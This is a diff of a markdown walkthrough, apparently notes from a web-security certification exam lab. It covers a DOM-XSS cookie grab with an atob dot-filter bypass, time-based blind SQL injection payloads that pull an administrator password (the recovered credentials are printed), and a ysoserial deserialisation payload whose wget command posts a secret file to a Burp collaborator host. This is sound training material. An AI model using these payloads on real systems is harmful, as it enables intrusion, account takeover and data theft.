@@ -5,7 +5,10 @@ Active Scan => DOM-XSS => "-alert(1)-"
 ![image](https://user-images.githubusercontent.com/40497633/233626048-0866c789-cc7c-4278-ae84-721bbfa8ef41.png)
 
 
-dots are blocked => first bypass to get cookie => alert(document['cookie']) cannot exfiltrate data as dots are needed for the burp collab domain so we have to use atob to use it as base64.
+dots are blocked => first bypass to get cookie => alert(document['cookie']) </br>
+
+Cannot exfiltrate data as dots are needed for the burp collab domain so we have to use atob to use it as base64.
+
 ![image](https://user-images.githubusercontent.com/40497633/233626299-da46ddec-1288-49fe-a557-3380039229c0.png)
 
 ![image](https://user-images.githubusercontent.com/40497633/233626763-d3d2cd7d-1359-4f72-8ba5-f295416ce4c0.png)
@@ -46,22 +49,37 @@ manual:
 Detection with time-based blind SQLi:
 sort-by=DATE;SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--
 
+![image](https://user-images.githubusercontent.com/40497633/233630036-b0f18f22-36d5-4e93-9d38-d8a63658da5e.png)
+
+
 Find password lenght:
 sort-by=DATE;SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>$20$)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--
+
+![image](https://user-images.githubusercontent.com/40497633/233630972-9d0c611e-6f37-458f-8fdc-ba2e5233c144.png)
+
 
 20 cars
 
 Find password:
 sort-by=DATE;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,$1$,1)='$a$')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--
 
-1234567891011121314151617181920
+![image](https://user-images.githubusercontent.com/40497633/233631386-ddf5a1da-c494-4942-a58d-5c53c868aa30.png)
+![image](https://user-images.githubusercontent.com/40497633/233631517-fbbc06d0-1dc7-4886-ae9f-89347e25d57f.png)
+![image](https://user-images.githubusercontent.com/40497633/233631598-4bd414ff-a32f-493d-b288-bebf8050dd6c.png)
+
+![image](https://user-images.githubusercontent.com/40497633/233632259-3a0fcab8-dced-4286-bfe1-641aeeb223b5.png)
+
+1234567891011121314151617181920 </br>
 b9v9whchew y p e w t l 1 y g v
 
-creds admin:
-login: administrator
-password: b9v9whchewypewtl1ygv
+creds admin: </br>
+login: administrator </br>
+password: b9v9whchewypewtl1ygv </br>
 
 Administrator account takeover!
+
+![image](https://user-images.githubusercontent.com/40497633/233632577-10e78dca-ac22-4393-88e2-4b3161f3841c.png)
+
 
 # Data exfiltration
 
@@ -86,13 +104,23 @@ H4sIAAAAAAAA%2fzWPPU7DQBCFF0RSQcMJpkOi2PTQEH4iCkcKClJEOV6Pk8HrHbO7dmKQOA4VJ%2bAI
 
 extension Java deserialisation scanner => exploitation 
 
+![image](https://user-images.githubusercontent.com/40497633/233633030-60e1c7bd-e027-457a-8f42-b6dabbf77025.png)
+
+
 Compress using gzip + Encode using Base64 + Encode using URL encoding
 
 Payload: CommonsCollections7 'wget https://your.burp.oastify.com --post-file=/home/carlos/secret'
 
+![image](https://user-images.githubusercontent.com/40497633/233633752-42f9ab49-33e5-402b-ba27-992a27f24541.png)
+
 Received request data => solution-NMN8OGrvOL0ehJ5wqoNWIGTWPwaTZZ8Z
 
+![image](https://user-images.githubusercontent.com/40497633/233633925-7d79152e-d7c9-4f32-a3c7-8350140b6158.png)
+
+
 /!\ Configure the path to the ysoserial.jar file in the extension config and use another version of ysoserial if that doesn't work.
-/!\ HTTP/2 required
 
 Practical Exam Completed !
+
+![image](https://user-images.githubusercontent.com/40497633/233634102-07d01a1c-a211-4af8-9a77-bf7a8572774e.png)
+
